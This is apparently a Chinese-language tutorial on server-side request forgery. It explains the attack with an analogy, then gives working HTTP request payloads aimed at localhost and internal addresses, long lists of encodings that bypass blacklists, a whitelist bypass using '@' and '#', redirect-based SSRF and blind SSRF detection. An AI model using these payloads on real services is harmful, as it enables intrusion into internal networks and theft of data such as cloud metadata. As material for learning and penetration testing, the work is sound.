# SSRF攻击方式汇总

## 原理

涉及到SSRF的地方往往与公司的整个内网有关，因此涉及到SSRF的漏洞往往都有还不错的危害评级。

如果把存在SSRF攻击面的机器比作公司大楼保安.

第一种SSRF就好比，攻击者穿着外卖员的衣服跟保安说要进去送个外卖，然后保安相信了，这个时候攻击者就可以在公司大楼内部到处闲逛，这种就属于危害级别最高的SSRF；

第二种SSRF是公司给保安交代了明确规定外来人员不准进入公司大楼，这个时候外卖员跟保安说去跟我带个信，说一声某人外卖到了，然后保安问了说有就是这个人确实点了外卖，说没有就说明这个人没有点外卖或者说没有这个人；

第三种SSRF就更难了，保安收到了公司消息说是不准外来人员进入大楼，那外卖员让保安带个信，问这个人在不在，在就下来拿外卖，然后又多问了一嘴，问从哪里下来的，大概要多久才能到这里，保安觉得没啥大不了问了就消息一并告诉他了。

SSRF的全称是服务器端请求伪造（Server-side request forgery），通常情况下他的起因是公司的某些服务器因为需要长期和外界网络进行信息交互，对外界的某些请求需要在公司内部其他服务器上进行查询，同时因为该机器需要保持与外界的交流，所以该机器对外界的消息传递是不得不接受的，而因为某些配置或者某些精巧的绕过手法使得攻击者的意图隐藏在了看似正常的消息传递环节里。而其他服务器在进行查询时返回了攻击者的期望内容，因此就产生了SSRF攻击。

## SSRF攻击服务器本机

在某些业务情况下，用户发起请求时服务器需要通过其内的api接口对信息进行访问，该接口由于其可以对输入url进行解析请求,并对请求结果返回，因此可以进行SSRF攻击，如下：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

将 api 处内容换位本机地址：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

如果服务器在对localhost内容进行请求，则顺利构成SSRF攻击。

## SSRF内网漫游

与上图一样，如果将请求的内容换成如下：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.1.1/admin
```

如果将上述内容 localhost 改为内网地址，在 burp 的intruder模块对内网地址进行爆破，对存活主机进行目录爆破，即可实现内网漫游。

## 黑名单绕过

上述两种SSRF可以说是非常理想的场景了，然而事实是，在如今的实际业务场景中几乎不会出现如此理想的攻击环境，往往存在各种的waf、行为感知、黑名单、百名单等进行攻击阻断

那么当127.0.0.1被禁止 了该如何处理？

以下都是可以尝试的替换方案：

```http
# Localhost 绕过
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://0
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR 绕过
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# 点号绕过
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# 十进制 绕过
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# 八进制 绕过
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# 十六进制绕过
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# 也可以尝试混合不同的绕过方式，可以使用如下网站借助完成：
# https://www.silisoftware.com/tools/ipconverter.php

# 比较少见的绕过方式
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS解析绕过
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

## 白名单绕过

白名单的主要绕过方式来自于各设备的规律规则没有对URL的规范贯彻，主要就是 `@` 和 `#` 这两个符号：如下，其中一个 `url` 是白名单要求的 `url` ，另一个 `url` 是我们需要请求的 `url` ，这俩 `url` 随便顺序组合（最好都尝试），然后中间用 `@`、`#`、`@#`、`#@` 进行链接，甚至对各个符号进行一次编码、二次编码在进行拼接，甚至在`@#`和`#@`这种情况下对其中一个进行一次、二次编码之后再进行拼接。对，白名单就是这样进行绕过。

```txt
https://URL_1@URL_2
```

## 重定向里的SSRF

通常出现在这样的业务场景里，利用方式如下：

get方式：`/product/nextProduct?currentProductId=6&path=http://192.168.1.1/admin`

post方式：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.1.1/admin
```

## Blind SSRF

Blind SSRF的发现方式通常都是将自己vps的地址放在可能存在攻击点的地方，然后监听vps相应端口，等待攻击完成后看是否有收到像一个请求。从而判定是否存在Blind SSRF。

## Blind SSRF打出危害

由于Blind SSRF没有回显，因此相关的可以利用的价值极低，不过最近我发现了一个技术叫shellshock攻击的技术可以通过Blind SSRF拿出数据，还在研究，研究透彻了会发出。